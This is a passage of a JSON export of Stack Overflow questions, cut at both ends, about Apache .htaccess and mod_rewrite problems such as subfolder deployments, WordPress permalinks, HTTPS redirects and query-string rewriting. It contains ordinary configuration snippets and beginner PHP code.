/cake/app/webroot\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ index.php?/$1 [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","cakephp","cakephp-2.0","shared-hosting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13000006,"title":"Deploy CakePHP to a subfolder","body":"<p>I have created a CakePHP 2 app, and now I'm trying to deploy it to a production web server.</p>\n\n<p>My app uses the default folder structure (app/lib/plugins/vendors), default htaccess, default routing, nothing special.</p>\n\n<p>I've been developing locally as if the app were in the root folder of the site (e.g. <a href=\"http://mycakeapp.localhost/\" rel=\"nofollow\">http://mycakeapp.localhost/</a> takes me to the site). But I'm deploying to a site (shared hosting) where that will not be the case (e.g. <a href=\"http://www.somedomain.com/mycakeapp\" rel=\"nofollow\">http://www.somedomain.com/mycakeapp</a>).</p>\n\n<p>It doesn't work (I didn't really expect it to), so I assumed I had to tweak one or more htaccess files. I tried modifying the root .htaccess <a href=\"http://mamun.info/2010/09/08/cakephp-in-a-subdirectory/\" rel=\"nofollow\">as suggested in this post</a>, but that only partially worked (the link to the CSS didn't work, for instance):</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\nRewriteRule  ^mycakeapp$  mycakeapp/app/webroot/  [L]\nRewriteRule  ^mycakeapp/(.*)$  mycakeapp/app/webroot/$1  [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>So what should I do to all the htaccess files to make this CakePHP site work in a subfolder?</p>\n\n<h2>UPDATE:</h2>\n\n<p>There's an .htaccess file in the root of the site, I've pasted its contents below. Is something in there screwing it up?</p>\n\n<pre><code>RewriteEngine on\nOptions +FollowSymLinks\nRewriteCond %{HTTP_HOST} ^somedomain\\.com$ [NC]\nRewriteRule ^(.*)$ http://www.somedomain.com/$1 [R=301,L]\nRewriteCond %{SERVER_PORT} !^443$\nRewriteRule ^secure/$ https://www.somedomain.com/secure [R=301,L]\nRewriteRule ^about\\.html$ /contact.php [R=301,L]\nRewriteRule ^contact\\.html$ /contact.php [R=301,L]\nRewriteRule ^download\\.html$ /signup.php [R=301,L]\nRewriteRule ^index\\.html$ /index.php [R=301,L]\nRewriteRule ^privacy\\.html$ /policies.php [R=301,L]\nRewriteRule ^website\\.html$ /business-websites.php [R=301,L]\nRewriteRule ^return\\.html$ /policies.php [R=301,L]\n</code></pre>\n"},{"tags":["wordpress","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13002621,"title":"wordpress multisite with sub-domain pretty permalinks","body":"<p>i am trying to set up a wordpress (3.4.2) multisite. The current site already has the following apache rules applied, <em>which i do not have the permissions to edit</em> </p>\n\n<pre><code>&lt;VirtualHost xx.xx.xx.xxx:80&gt;\n  ServerName foo.example.nl\n  ServerAlias www.foo.example.nl\n  DocumentRoot /web/sites/example.nl/foo/www\n  RewriteEngine On\n&lt;Location /&gt;\n  Allow from all\n&lt;/Location&gt;\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>this works fine however i found that trying to set up permalinks with 'Post name' options always gives me a 404 redirect.\n<a href=\"http://foo.example.nl/post1\" rel=\"nofollow\">http://foo.example.nl/post1</a> = 404 Not Found</p>\n\n<p>at the moment i have un-installed multisite just to try and get the pretty urls working with the sub-domain but after trying lots of different variations of my .htaccess but nothing seems to be working. here is the current .htaccess wordpress generates:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n RewriteEngine On\n RewriteBase /\n RewriteRule ^index\\.php$ - [L]\n RewriteCond %{REQUEST_FILENAME} !-f\n RewriteCond %{REQUEST_FILENAME} !-d\n RewriteRule . /index.php [L]\n &lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["php","apache",".htaccess","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12984671,"title":"Rewrite all directory requests to a subdirectory with .htaccess","body":"<p>I am trying to rewrite all requests made to <code>/myproj</code>(or any files inside it) to <code>/myproj/web</code> using .htaccess. </p>\n\n<p>The problem I am having is that the requests with a trailing slash (e.g., <code>/myproj/somefile.php/</code>) are somehow being rewritten to <code>/docroot/index.php</code> instead of <code>/myproj/web/somefile.php/</code>.</p>\n\n<p>My <code>/myproj/.htaccess</code> file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteRule ^(.*)$ /myproj/web/$1 [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13003319,"title":".htaccess rewrite query string as path","body":"<p>I've searched for this question but I only come across really specific answers that seem difficult to tailor to my specific needs.</p>\n\n<p>Let's say the URL I'm attempting to rewrite is this:</p>\n\n<pre><code>http://www.example.org/test.php?whatever=something\n</code></pre>\n\n<p>I want to rewrite it so that it appears as this:</p>\n\n<pre><code>http://www.example.org/test/something\n</code></pre>\n\n<p>How can I do this?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13002241,"title":"How to redirect a folder and its pages to a single page","body":"<p>I'm trying to redirect some files and I'm pretty stuck. There are way too many to do some of them on a \"page-per-page\" basis and so I need a quick way as these pages are insignificant but return 404's at the moment. </p>\n\n<p>I have a page like this \"/old-blog/tag/page\", I previously redirected the \"old-blog\" to \"new-blog\" so I get \"/new-blog/tag/page\" but now I want \"tag\" and all pages after this to be sent to \"new-blog\". I hope this example makes sense, please ask if I've missed something. </p>\n\n<p>I'm doing my redirects with my .htaccess file so I'd like a method I can use with this in mind. </p>\n\n<p>Thanks, Dan. </p>\n"},{"tags":["wordpress","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12839359,"title":"htaccess redirect to subfolder with exception","body":"<p>I've searched quite a lot without finding a solution. </p>\n\n<p>I have a wordpress blog in <code>/_wp</code> and something else in <code>/other</code></p>\n\n<p>What I'm trying to is that every request gets redirected to the WordPress. Except those to <code>/other</code> and its child directories. I also want the access to the blog to be rewritten. Few examples to make it clear:</p>\n\n<pre><code>/ --&gt; /_wp/\n\n/ablogpost --&gt; /_wp/ablogpost\n\n/other --&gt; /other\n\n/other/bingou --&gt; /other/bingou \n</code></pre>\n\n<p>I've tried a few things but what seems the most logical to me is:</p>\n\n<ul>\n<li><p>don't touch the .htaccess of /_wp/ and of /other/</p></li>\n<li><p>edit the .htaccess of the root '/' by adding:\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^(www.)?mywebsite.com$\nRewriteCond %{REQUEST_URI} !^(/other|/other/.*)$\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^/?(.*)$ /_wp/$1\n</pre></code></p></li>\n</ul>\n\n<p>If you could tell me what is wrong there it would be great!</p>\n\n<h1>EDIT</h1>\n\n<p>After changing the index the subfolders were still not working here was my .htaccess back then:</p>\n\n<pre><code>IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*\n&lt;Limit GET POST&gt;\n   order deny,allow\n   deny from all\n   allow from all\n&lt;/Limit&gt;\n&lt;Limit PUT DELETE&gt;\n   order deny,allow\n   deny from all\n&lt;/Limit&gt;\nAuthName site.com\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n    RewriteRule ^index\\.php$ - [L]\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<h1>EDIT 2</h1>\n\n<p>In the end it was a host problem thanks for your help though! Your answer works just well</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12990111,"title":"mod_rewrite rules for a site hosted in a directory","body":"<p>I have a site that i am building in a directory, not in the root of my webserver.</p>\n\n<pre><code>I would like  http://localhost/mysite/index.php?view=home\n\nto rewrite to http://localhost/mysite/home\n</code></pre>\n\n<p>I can't get it to work</p>\n\n<p>trying this in .htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /mysite/\nRewriteRule ^([^/]*)$ index.php?view=$1 [L]\n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13002058,"title":".htaccess rewrite error when using more than one parameter","body":"<p>I have this in my .htaccess :</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteCond %{SCRIPT_FILENAME} !-d\nRewriteCond %{SCRIPT_FILENAME} !-f\nRewriteRule . /index.php\n</code></pre>\n\n<p>and this is how i work with the parameters :</p>\n\n<pre><code>&lt;?php\n    $request = $_SERVER['REQUEST_URI'];\n    $request = substr($request,1);\n    $params = explode('/', $request);\n    $safe_pages = array('page1','page2','page3');\n    if(in_array($params[0],$safe_pages))\n            {\n                include($params[0].'.php');\n            }else\n            {\n                include('404.php');\n            }\n?&gt;\n</code></pre>\n\n<p>Let's say my site is : www.site.com</p>\n\n<p>www.site.com/page -> works perfectly</p>\n\n<p>www.site.com/page/parameter -> doesn't load any css or images because it looks for them in root/page instead of root/</p>\n\n<p>I tried to use absolute links for my css and images but it still didn't work, so i guess the problem is in the .htaccess or i'm missing something.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13001203,"title":"How do i redirect a directory to the parent directory in htacess","body":"<p>I have this website <code>http://www.foo.com/bar/index.php</code>.  I recently moved my site FROM <code>foo.com/bar/index.php</code> TO <code>foo.com/index.php</code> </p>\n\n<p>In my htaccess file, how do i write the conditions so that if any request is made from lets say <code>.foo.com/bar/somedirectory/somefile</code> REDIRECT to  <code>foo.com/somedirectory/somefile</code></p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":4,"view_count":48,"score":-4,"question_id":13001548,"title":"how to make link in php like subdomain link","body":"<p>hi all members of stackoverflow</p>\n\n<p>i have question \ni need A detailed explanation to convert this link :</p>\n\n<pre><code>http://localhost/mosta3ml/file.php?action_name=last_result\n</code></pre>\n\n<p>to :</p>\n\n<pre><code>http://last_result.localhost/mosta3ml/\n</code></pre>\n\n<p>i mean i want to make link like sub domain with htaccess ?</p>\n"},{"tags":["wordpress",".htaccess","mod-rewrite"],"answer_count":8,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":7949,"score":3,"question_id":2322559,"title":".htaccess & Wordpress: Exclude folder from RewriteRule","body":"<p>I have this .htaccess file in Wordpress. It's located at /public_html/ (web root). I need to exclude a folder (csNewsAd) from the rewrite engine. I've tried this, based from another question similar here at SO, but didn't work at all.</p>\n\n<p><pre><code>AddHandler x-httpd-php5 .php\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^/csNewsAd($|/) - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule>\n# END WordPress</pre></code></p>\n\n<p>Any suggestions?</p>\n\n<h1>More data</h1>\n\n<p>There's another .htaccess inside /csNewsAd for password protection:</p>\n\n<p><pre><code>\nAuthName \"Clasificados\"\nAuthType \"basic\"\nAuthUserFile /home/ig000192/public_html/csNewsAd/.passwd\nRequire valid-user\n</pre></code></p>\n"},{"tags":[".htaccess","mod-rewrite","dynamic-image-generation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12996453,"title":"htaccess rewrite. Serve .php file when .gif is accessed","body":"<p>I have a dynamic image, which I wish to serve looking like a static image.</p>\n\n<p>e.g. Current url of the image is</p>\n\n<pre><code>http://site.co.uk/media/dynamicImage.php\n</code></pre>\n\n<p>I wish for the image to be accessed using </p>\n\n<pre><code>http://site.co.uk/media/dynamicImage.gif\n</code></pre>\n\n<p>How do I use .htaccess to serve the dynamicImage.php file when dynamicImage.gif is accessed?</p>\n\n<p>Please note that I don't want to rewrite ALL files in a folder as per this example: <a href=\"http://stackoverflow.com/questions/12925567/apache-rewrite-images-to-php-file-with-htaccess\">Apache - rewrite images to php file with .htaccess</a>, I just want to rewrite the files I specify.</p>\n"},{"tags":["apache",".htaccess","http","https"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12999910,"title":"Https to http redirect using htaccess","body":"<p>I'm trying to redirect <a href=\"https://www.mydomain.com\" rel=\"nofollow\">https://www.mydomain.com</a> to <a href=\"http://www.mydomain.com\" rel=\"nofollow\">http://www.mydomain.com</a>. I tried the following code in the .htaccess file</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^mydomain\\.com$ [NC]\nRewriteRule ^(.*)$ http://www.mydomain.com/$1 [R=301,L]\n</code></pre>\n\n<p>This code successfully redirects <a href=\"https://mydomain.com\" rel=\"nofollow\">https://mydomain.com</a> to <a href=\"http://www.mydomain.com\" rel=\"nofollow\">http://www.mydomain.com</a>. However when I type in <a href=\"https://www.mydomain.com\" rel=\"nofollow\">https://www.mydomain.com</a> then it gives me a \"web page not available\" error in the browser.</p>\n\n<p>I have also tried the following 2 codes without success</p>\n\n<p>Attempt 1</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} !=on\nRewriteRule ^/(.*):NOSSL$ http://www.mydomain.com/$1 [R=301,L]\n</code></pre>\n\n<p>Attempt 2</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} on\nRewriteRule (.*) http://%{HTTP_HOST}%{REQUEST_URI}\n</code></pre>\n\n<p>Both above attempts failed. Any suggestions?</p>\n"},{"tags":["php","mysql","regex",".htaccess","patterns"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12999692,"title":"Mod Rewrite Pattern Issue","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5484084/what-literal-characters-should-be-escaped-in-a-regex\">What literal characters should be escaped in a regex?</a>  </p>\n</blockquote>\n\n\n\n<pre><code>RewriteRule ^profile/[A-Za-z_-\\d\\^\\.]/*$ ./index.php?page=showuser&amp;username=$1\n</code></pre>\n\n<p>I am new to mod rewrite. Could someone tell me what's wrong with my pattern here? I am trying to only let names passed in that have characters, numbers, -, ^, _ and . symbols but it will give me an error when I use that syntax. </p>\n"},{"tags":["php","string","query",".htaccess","url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12999700,"title":"remove query string form url with htaccess","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5464481/clean-urls-for-search-query\">Clean URLs for search query?</a>  </p>\n</blockquote>\n\n\n\n<p>I made a php webpage for checking the color code,here is the first four line</p>\n\n<pre><code>if(isset($_GET['c']))\n$hex = $_GET['c'];\nelseif(!isset($_GET['c']))\n$hex = $_POST['c'];\n</code></pre>\n\n<p>and my htaccess have:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^([a-zA-Z0-9]{6})$ index.php?c=$1 [L]\n</code></pre>\n\n<p>if I type site.com/ffcdee it successfully show the color #ffcdee\nbut if i use the input box:</p>\n\n<pre><code>&lt;form action=\"\"&gt;\n&lt;input type=\"text\" name=\"c\" &gt;\n&lt;input type=\"submit\" value=\"Search\" id=\"search-submit\"&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>it show site.com/?c=ffcdee,\nI tried change input name to other word,but the script not work anymore..\nhow can I remove the ?c= from the url?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":36,"score":0,"question_id":12991298,"title":"Redirect multiple domains to subdirectories","body":"<p>I have multiple domains pointing to my VPS (Virtual Private Server). What I want is, for example, if I write: <code>www.domain1.com</code>, redirect to <code>www.domain.com:8080/app1</code>, because I have apps with Tomcat. The same with <code>www.domain2.com</code>, to <code>www.domain2.com:8080/app2</code>, etc.</p>\n\n<p>Can I do that with htaccess? </p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":145,"score":1,"question_id":5139735,"title":"detecting IE 6 using .htaccess","body":"<p>Is there any way to detect IE6 through htaccess?</p>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":27,"score":-1,"question_id":12998875,"title":"How do I make a .htaccess file redirect any .org to its corresponding .com?","body":"<p>I have a .htaccess file which right now looks like this:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteCond %{HTTP_HOST} ^(.*).org$ [NC]\n\nRewriteRule ^(.*)$ http://foo.com/$2 [R=301,L]\n</code></pre>\n\n<p>Is it possible to put a variable in for the \"foo.com\" bit to just redirect to the same domain that was input, but with .com instead of .org?</p>\n"},{"tags":["php",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":8484463,"title":"How can we set the url for Core PHP based website","body":"<p>I would like to know how to change this URL:</p>\n\n<p><a href=\"http://www.example.com/category/test.php\" rel=\"nofollow\">http://www.example.com/category/test.php</a></p>\n\n<p>to this URL:</p>\n\n<p><a href=\"http://www.example.com/category/test/\" rel=\"nofollow\">http://www.example.com/category/test/</a> </p>\n\n<p>We don't want to use any file extension in the end of the file name (like .html , .php). Is there any suitable way to edit the url in PHP based website?</p>\n"},{"tags":[".htaccess","mod-rewrite","https","url-rewriting","rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":12975992,"title":"Apache mod_rewrite rules to disable https/ssl except for some pages","body":"<p>I have a website that trigger HTTPS when brosing some pages and I want to revert back to HTTP when not browsing those pages, and this is my htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\n  RewriteEngine on\n  #RewriteBase /myproject/\n\n  # toggle www prefix\n  RewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\n  RewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n\n  # redirect favicon requests to the correct favicon.ico\n  RewriteCond %{REQUEST_URI} !^/favicon\\.ico [NC]\n  RewriteCond %{THE_REQUEST} favicon\\.(ico|png|gif|jpe?g) [NC]\n  RewriteRule (.*) http://mysite/favicon.ico [R=301,L]\n\n  # hide index.php from root\n  RewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s(.*)/index\\.php [NC]\n  RewriteRule ^ /%1 [R=301,L]\n\n  # disable HTTPS when not needed\n  RewriteCond %{HTTPS} on\n  #RewriteCond %{HTTP_REFERER} !^(https)(.*)$\n  RewriteCond %{REQUEST_URI} !^(.*)/(exception|xyz|pqr)(.*)$ [NC]\n  RewriteRule (.*) http://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n\n  # if a directory or a file exists, use it directly\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n\n  # otherwise forward it to index.php\n  RewriteRule . index.php [L,QSA]\n  #RewriteRule ^(.*)\\?*$ index.php/$1 [L,QSA]\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>If I call <code>https://host/url</code> the redirect works fine landing to <code>http://host/url</code>, but if I call <code>https://host/exception</code> instead of leaving it as is I'll be redirected to <code>http://host/index.php</code></p>\n\n<p>What's wrong? Thanks</p>\n\n<hr>\n\n<p><strong>UPDATE with solution</strong>, hoping it will be useful to someone</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\n  RewriteEngine on\n  #RewriteBase /yourbase\n\n  # hide index.php from root\n  RewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s(.*)/index\\.php [NC]\n  RewriteRule ^ /%1 [R=301,L]\n\n  # pass-through so when the rules loop (https), the redirect to index won't get applied\n  RewriteRule index.php$ - [L]\n\n  # toggle www prefix\n  RewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\n  RewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n\n  # redirect favicon requests to the correct favicon.ico\n  RewriteCond %{REQUEST_URI} !^/favicon\\.ico [NC]\n  RewriteCond %{THE_REQUEST} favicon\\.(ico|png|gif|jpe?g) [NC]\n  RewriteRule (.*) http://liberos.it/favicon.ico [R=301,L]\n\n  # disable HTTPS when not needed (but don't rewrite direct files requests)\n  RewriteCond %{HTTPS} on\n  #RewriteCond %{HTTP_REFERER} !^(https)(.*)$\n  RewriteCond %{REQUEST_URI} !^(.*)/(yourpath|another/path)(.*)$ [NC]\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteRule (.*) http://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n\n  # if a directory or a file exists use it directly, otherwise forward it to index.php\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteRule . index.php\n  #RewriteRule ^(.*)\\?*$ index.php/$1 [L,QSA]\n\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","redirect","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12998294,"title":"how to remove trailing %20target= from url using htaccess","body":"<p>Recently i have been using stackoverflow to fix many of my server errors.  Recently i have encountered the following error \"NOT FOUND 404 error\" for the following error.  </p>\n\n<p>I have seen from web master central that there are several hundred urls have trailing string \"%20target=\" I want to remove so that the url yield results.</p>\n\n<p>here is the sample.  i wanted to change the following url from </p>\n\n<p>www.example.com/one/two/three/four/five/For-Sale-26264.html%20target=</p>\n\n<p>to</p>\n\n<p>www.example.com/one/two/three/four/five/For-Sale-26264.html</p>\n\n<p>How can i achieve this using htaccess</p>\n"},{"tags":["php","python","django",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12998085,"title":"How can I ignore the Django framework for certain URLs?","body":"<p>I'm adding a new web application to a server, which currently hosts 4 websites using the Django framework. I've got a PHP web application and want to host it on the server too. However I don't have time to convert the application to Django, about which I know little.</p>\n\n<p>So basically my PHP app sits at <code>http://82.*.*.*/templates/blah/</code> and I point my domain to the IP address. I've no idea about the main entry point for Django, so I've tried adding the following rewrite rule to the top of the file /etc/httpd/conf.d/python.conf:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^(www.)?myphpapp.com$\nRewriteRule ^(/)?$ templates/blah/ [L]\n</code></pre>\n\n<p>However I'm getting Django errors when I try to load the page.</p>\n\n<p><strong>Update..</strong></p>\n\n<p>I'm reading about doing this with VirtualHost (the python.conf file uses VirtualHost) and is defined as..</p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n\nDocumentRoot \"/var/www/djangosites/\"\n\n(..rewrite rules..)\n\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>I've therefore tried adding my own entry ie..</p>\n\n<pre><code>&lt;VirtualHost www.myphpapp.com:80&gt;\n    DocumentRoot \"/var/www/myapp/\"\n    ServerName www.myphpapp.com\n    ServerAlias www.myphpapp.com\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>This works for my new app, however it now redirects all the existing django domains to my new app!</p>\n"},{"tags":["php","regex",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12662571,"title":"htaccess more than 9 variables","body":"<p>I am having more than 9 params in my url to be mapped into particular php file. Url is </p>\n\n<blockquote>\n  <p><a href=\"http://abc.com/USA/NY/male/NY/all-status/all-religion/all-ethnicity/all-cast/all-professions/all-educations/recent_posted\" rel=\"nofollow\">http://abc.com/USA/NY/male/NY/all-status/all-religion/all-ethnicity/all-cast/all-professions/all-educations/recent_posted</a></p>\n</blockquote>\n\n<p>and my htaccess rule is </p>\n\n<blockquote>\n  <p>RewriteRule\n  ^USA/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/?$\n  search.php?counrty=USA&amp;state=$1&amp;gender=$2&amp;r_city=$3&amp;r_mstatus=$4&amp;r_religion=$5&amp;r_ethnicity=$6&amp;r_cast=$7&amp;r_profession=$8&amp;r_education=$9&amp;sort_by=$10\n  [NC]</p>\n</blockquote>\n\n<p>It is not working</p>\n\n<p>Can please anybody sort out this issue? I need proper regex rule and URL</p>\n"},{"tags":["php",".htaccess"],"answer_count":7,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1350,"score":4,"question_id":6157282,"title":"Using htaccess, how to restrict seeing directory contents, but allow server to use the contents?","body":"<p>More specifically, I have an htaccess file that restricts anyone from seeing the directory contents. Such that, nobody can see my 1000s of images in www.example.com/images by using:</p>\n\n<pre><code>deny from all\nallow from 127.0.0.1\n</code></pre>\n\n<p>However, I want to use these images on www.example.com such that, \n<code>&lt;img src=\"images/thisimg.jpg\" /&gt;</code> works.</p>\n\n<p>I hope I'm in the right direction, but I appreciate any insight/re-direct. This is similar to: <a href=\"http://stackoverflow.com/questions/4390876/how-to-protect-all-directory-contents-but-gain-access-to-php-script\">How to protect all directory contents, but gain access to php script</a> but I want to link to these images in that directory, and using <code>deny from all</code> does not allow me to do that. </p>\n\n<p>Thanks in advance for your help.</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12997342,"title":"Redirect based on port number?","body":"<p>Is it possible to redirect <code>domain.com:88 to domain.com:8080</code> using htaccess &amp; mod_rewrite?\nAnd example please?</p>\n\n<p>If htaccess can't do it, waht are other options?</p>\n"},{"tags":["php",".htaccess","colors","hex","check"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":45,"score":-1,"question_id":12997209,"title":"htaccess rewrite,remove string","body":"<p>I want to make a php website for checking the colorhex code,\nnow I have one problem while checking the code,\nmy script is </p>\n\n<pre><code>&lt;?php\necho'\n&lt;html&gt;&lt;head&gt;&lt;style&gt;\nbody{\nbackground-color:#'.$_GET['c'].';\n}\n&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;';\n?&gt;\n</code></pre>\n\n<p>and I type the url <a href=\"http://site.com/?c=FF0000\" rel=\"nofollow\">http://site.com/?c=FF0000</a>\nwill display the background-color as red, but I want to hide the ?c= with modding the htaccess  file,I have googled and tried but no one works,anyone know how to do this?</p>\n"},{"tags":["php",".htaccess","mod-rewrite","get"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":53,"score":-1,"question_id":12997257,"title":"Rewrite PHP all GET parameters .htaccess","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/265898/mod-rewrite-php-and-the-htaccess-file\">mod_rewrite, php and the .htaccess file</a>  </p>\n</blockquote>\n\n\n\n<p>Would like this to happen in the .htaccess file.\nto rewrite</p>\n\n<pre><code>index.php?pagetype=name\n</code></pre>\n\n<p>to</p>\n\n<pre><code>/pagetype/name/\n</code></pre>\n\n<p>do this for all pagetypes so</p>\n\n<pre><code>?user=name\n?post=number\n?life=sucks ... etc\n</code></pre>\n\n<p>but would like to exclude</p>\n\n<pre><code>/css/\n/images/\n/js/\n/php/\n/template/\n</code></pre>\n\n<p>so the variable links still work.</p>\n\n<p>I am guessing this should work but I want it in it's most simplest form so I don't have to change the .htaccess file everytime I add a pagetype.</p>\n\n<p>I did a search for this but didn't find anything helpful.</p>\n\n<p>The site will only have one physically accessed file: index.php then the rest are processed via $_GET commands</p>\n"},{"tags":[".htaccess","url","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":21,"score":2,"question_id":12996456,"title":".Htaccess to redirect all files in various folders and subfolders by removing a particular word","body":"<p>I have a images gallery and I am wondering if its possible to strip the word normal_ from the file name of each file in various folders and sub-folders, i got some 500 folders and over 50,000 image files.</p>\n\n<p>I am trying to get - </p>\n\n<p><a href=\"http://www.photos.com/gallery/albums/1/normal_image1.jpg\" rel=\"nofollow\">http://www.photos.com/gallery/albums/1/normal_image1.jpg</a> to <a href=\"http://www.photos.com/gallery/albums/1/image1.jpg\" rel=\"nofollow\">http://www.photos.com/gallery/albums/1/image1.jpg</a> </p>\n\n<p><a href=\"http://www.photos.com/gallery/albums/events/10/normal_photo2.jpg\" rel=\"nofollow\">http://www.photos.com/gallery/albums/events/10/normal_photo2.jpg</a> to <a href=\"http://www.photos.com/gallery/albums/events/10/photo2.jpg\" rel=\"nofollow\">http://www.photos.com/gallery/albums/events/10/photo2.jpg</a></p>\n\n<p>So basically I want to redirect 301 all the files without the word normal. I am not sure how do to it recursively for all folders and sub-folders for the files 